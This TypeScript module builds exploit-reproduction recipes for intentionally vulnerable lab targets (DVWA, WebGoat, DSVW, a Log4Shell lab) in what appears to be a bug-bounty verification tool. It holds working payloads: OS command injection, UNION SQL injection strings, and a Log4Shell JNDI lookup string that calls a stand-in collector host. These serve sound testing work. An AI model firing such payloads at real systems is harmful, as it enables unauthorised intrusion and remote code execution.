import type { ReproductionRecipe } from "@/lib/reproduction/types";

/**
 * Reproduction recipes for the four onboarding targets beyond juice-shop: DVWA, WebGoat, DSVW
 * and a Log4Shell lab. These are scaffolding. Each recipe names a real, documented vulnerability
 * class and the endpoint that carries it, and each oracleCheck is unit-tested against synthetic
 * responses in recipes.test.ts. What none of them is yet is a run that has actually happened
 * against a built image, which is the same status juice-shop had before its snapshot was built
 * and verified.
 *
 * One honest constraint shapes all four. The orchestrator (lib/sandbox/reproduce.ts) delivers
 * the run's fresh canary only by substituting "{{canary}}" inside a POST request body, sends
 * that body as application/json, and hands the oracle only 2xx in-band responses. juice-shop
 * fits because it is a JSON API whose search UNION reads back a canary seeded through its own
 * JSON registration endpoint. The apps here do not fit as cleanly:
 *
 *   - DVWA and WebGoat read form-encoded parameters, not JSON, and sit behind a login. The
 *     canary rides in the POST body (so it is substituted), but the built image has to accept
 *     the body and present the vulnerable page in an initialised, authenticated state.
 *   - DSVW takes its injection through a GET query string, and the orchestrator does not
 *     substitute the canary into a path today.
 *   - Log4Shell proves itself out of band (a JNDI callback), which the in-band oracle cannot
 *     observe at all.
 *
 * Each recipe below records its own gap in a comment, and docs/additional-targets.md lists the
 * orchestrator extension every non-JSON target needs before its recipe can run for real. The
 * canary placeholder is kept in the exploit regardless, so the recipe is already correct the
 * day that extension lands.
 */

const CANARY_PLACEHOLDER = "{{canary}}";

/** Pull the text of every <pre> block out of an HTML body. DVWA renders command output, and
 * only command output, inside <pre>, so this is what separates "the shell ran our command" from
 * "our input was echoed back somewhere on the page". Returns "" for a non-HTML body rather than
 * throwing. */
function preBlocks(body: string): string {
  let joined = "";
  const re = /<pre[^>]*>([\s\S]*?)<\/pre>/gi;
  let match: RegExpExecArray | null;
  while ((match = re.exec(body)) !== null) joined += match[1];
  return joined;
}

type DvwaConfig = { baseUrl: string; commandInjectionPath: string };

function isDvwaConfig(config: unknown): config is DvwaConfig {
  if (typeof config !== "object" || config === null) return false;
  const c = config as Record<string, unknown>;
  return typeof c.baseUrl === "string" && typeof c.commandInjectionPath === "string";
}

/**
 * DVWA command injection. On the low-security exec page, DVWA runs `ping -c 4 <ip>` and echoes
 * the result, so `127.0.0.1; echo <canary>` makes the shell print the canary as command output.
 *
 * Gap to close before this runs live: DVWA reads $_POST (form-encoded), so either the built
 * image accepts a JSON body on this endpoint or the orchestrator learns to send form-encoded
 * bodies. DVWA also requires a session and security=low; the built snapshot has to boot with the
 * database created and the page reachable, the same pre-verification juice-shop's snapshot got.
 */
function dvwaCommandInjectionRecipe(config: DvwaConfig): ReproductionRecipe {
  return {
    id: "dvwa-command-injection",
    title: "OS command injection in the DVWA command-execution page",
    keywords: ["command injection", "os command injection", "rce", "exec", config.commandInjectionPath],
    // No HTTP endpoint seeds a canary into DVWA, so the fixture only confirms the page answers.
    // The canary rides in the exploit body instead.
    fixture: { request: { method: "GET", path: config.commandInjectionPath } },
    negativeControl: {
      method: "POST",
      path: config.commandInjectionPath,
      body: { ip: "127.0.0.1", Submit: "Submit" },
    },
    exploit: {
      method: "POST",
      path: config.commandInjectionPath,
      body: { ip: `127.0.0.1; echo ${CANARY_PLACEHOLDER}`, Submit: "Submit" },
    },
    // Proof is the canary appearing in command output (<pre>), not merely somewhere on the page:
    // a page that reflected the submitted command verbatim would not count.
    oracleCheck: (response, canary) =>
      response.status === 200 && preBlocks(response.body).includes(canary),
  };
}

type WebGoatConfig = { baseUrl: string; sqlInjectionPath: string };

function isWebGoatConfig(config: unknown): config is WebGoatConfig {
  if (typeof config !== "object" || config === null) return false;
  const c = config as Record<string, unknown>;
  return typeof c.baseUrl === "string" && typeof c.sqlInjectionPath === "string";
}

/** WebGoat lesson endpoints answer with `{ lessonCompleted, feedback, output }`, where `output`
 * holds the rendered query result. Read the canary out of `output` specifically, so feedback
 * text that happened to echo the payload does not count. */
function canaryInWebGoatOutput(body: string, canary: string): boolean {
  let parsed: unknown;
  try {
    parsed = JSON.parse(body);
  } catch {
    return false;
  }
  if (typeof parsed !== "object" || parsed === null) return false;
  const output = (parsed as Record<string, unknown>).output;
  return typeof output === "string" && output.includes(canary);
}

/**
 * WebGoat SQL injection lesson. The string-injection assignment builds
 * `SELECT ... FROM user_data WHERE last_name = '<account>'`, so a UNION that selects the canary
 * as a literal makes it surface in the lesson's rendered output.
 *
 * Assumption to verify against the built image: the exact lesson path and the UNION column count
 * are WebGoat-version specific. `assignment5a` is the WebGoat 8.x string-injection assignment;
 * confirm both the path and how many columns user_data has, then match the UNION to it. Same
 * form-encoding and authentication gaps as DVWA apply, since WebGoat reads request parameters and
 * gates lessons behind a login.
 */
function webGoatSqlInjectionRecipe(config: WebGoatConfig): ReproductionRecipe {
  return {
    id: "webgoat-sqli-lesson",
    title: "UNION SQL injection in the WebGoat SqlInjection lesson",
    keywords: ["sql injection", "sqli", "union select", "webgoat", config.sqlInjectionPath],
    fixture: { request: { method: "GET", path: config.sqlInjectionPath } },
    negativeControl: {
      method: "POST",
      path: config.sqlInjectionPath,
      body: { account: "Smith", operator: "", injection: "" },
    },
    exploit: {
      method: "POST",
      path: config.sqlInjectionPath,
      // ponytail: column count assumed to match user_data; the operator confirms it against the
      // built WebGoat version and adjusts the literal list if the schema differs.
      body: {
        account: `' UNION SELECT '${CANARY_PLACEHOLDER}','x','x','x','x','x','x' FROM INFORMATION_SCHEMA.SYSTEM_USERS--`,
        operator: "",
        injection: "",
      },
    },
    oracleCheck: (response, canary) =>
      response.status === 200 && canaryInWebGoatOutput(response.body, canary),
  };
}

type DsvwConfig = { baseUrl: string; sqlInjectionPath: string };

function isDsvwConfig(config: unknown): config is DsvwConfig {
  if (typeof config !== "object" || config === null) return false;
  const c = config as Record<string, unknown>;
  return typeof c.baseUrl === "string" && typeof c.sqlInjectionPath === "string";
}

/**
 * DSVW SQL injection. DSVW answers `/?id=<n>` by reflecting the matched user row into the page,
 * so `id=2 UNION SELECT '<canary>'` reflects the canary when the injection executes.
 *
 * Gap to close before this runs live: DSVW takes the injection through the GET query string, and
 * the orchestrator substitutes the canary only inside a POST body, never a path. So the
 * "{{canary}}" below is sent literally today and the oracle never matches. Wiring canary
 * substitution into the request path (or exposing a POST variant of this endpoint on the built
 * image) is what this recipe waits on. The oracle itself is correct and tested.
 */
function dsvwSqlInjectionRecipe(config: DsvwConfig): ReproductionRecipe {
  const injection = `2 UNION SELECT '${CANARY_PLACEHOLDER}'`;
  return {
    id: "dsvw-sqli",
    title: "UNION SQL injection in the DSVW user lookup",
    keywords: ["sql injection", "sqli", "union select", "dsvw", `${config.sqlInjectionPath}?id=`],
    fixture: { request: { method: "GET", path: config.sqlInjectionPath } },
    negativeControl: {
      method: "GET",
      path: `${config.sqlInjectionPath}?id=1`,
    },
    exploit: {
      method: "GET",
      path: `${config.sqlInjectionPath}?id=${encodeURIComponent(injection)}`,
    },
    oracleCheck: (response, canary) => response.status === 200 && response.body.includes(canary),
  };
}

type Log4ShellConfig = { baseUrl: string; injectionPath: string; injectionHeader: string };

function isLog4ShellConfig(config: unknown): config is Log4ShellConfig {
  if (typeof config !== "object" || config === null) return false;
  const c = config as Record<string, unknown>;
  return (
    typeof c.baseUrl === "string" &&
    typeof c.injectionPath === "string" &&
    typeof c.injectionHeader === "string"
  );
}

/**
 * Log4Shell (CVE-2021-44228). The lab logs a request header through a vulnerable Log4j, so a
 * `${jndi:ldap://<collector>/<canary>}` value in that header triggers an outbound JNDI lookup
 * the moment it is logged.
 *
 * Gap to close before this runs live, and it is the largest of the four: Log4Shell proves itself
 * out of band. The evidence is the vulnerable app reaching a collector the run controls, keyed by
 * the canary, not anything in the HTTP response. The in-band oracle here checks the response body
 * for the canary, which some labs echo, but that is a weak in-band proxy. A real verdict needs an
 * out-of-band oracle: a per-run DNS or LDAP canary token and a collector the orchestrator can
 * ask "was I hit for this run's canary". The header also carries the canary, and header
 * substitution is not wired yet either. See docs/additional-targets.md.
 */
function log4ShellRecipe(config: Log4ShellConfig): ReproductionRecipe {
  const jndiValue = `\${jndi:ldap://bountydesk-collector.invalid/${CANARY_PLACEHOLDER}}`;
  return {
    id: "log4shell-jndi",
    title: "Log4Shell JNDI injection via a logged request header",
    keywords: ["log4shell", "jndi", "cve-2021-44228", "log4j", "rce"],
    fixture: { request: { method: "GET", path: config.injectionPath } },
    negativeControl: {
      method: "GET",
      path: config.injectionPath,
      headers: { [config.injectionHeader]: "1.0" },
    },
    exploit: {
      method: "GET",
      path: config.injectionPath,
      headers: { [config.injectionHeader]: jndiValue },
    },
    // In-band proxy only; the load-bearing proof is the out-of-band callback. See the doc above.
    oracleCheck: (response, canary) => response.status === 200 && response.body.includes(canary),
  };
}

/**
 * Recipe lookup for every onboarding target other than juice-shop, which recipes.ts keeps on its
 * own path. Returns [] for an unknown name or a config that does not carry the fields the
 * target's recipe reads, exactly like the juice-shop branch does.
 */
export function additionalRecipesForTarget(target: {
  name: string;
  config: unknown;
}): ReproductionRecipe[] {
  switch (target.name) {
    case "dvwa":
      return isDvwaConfig(target.config) ? [dvwaCommandInjectionRecipe(target.config)] : [];
    case "webgoat":
      return isWebGoatConfig(target.config) ? [webGoatSqlInjectionRecipe(target.config)] : [];
    case "dsvw":
      return isDsvwConfig(target.config) ? [dsvwSqlInjectionRecipe(target.config)] : [];
    case "log4shell-cve-lab":
      return isLog4ShellConfig(target.config) ? [log4ShellRecipe(target.config)] : [];
    default:
      return [];
  }
}
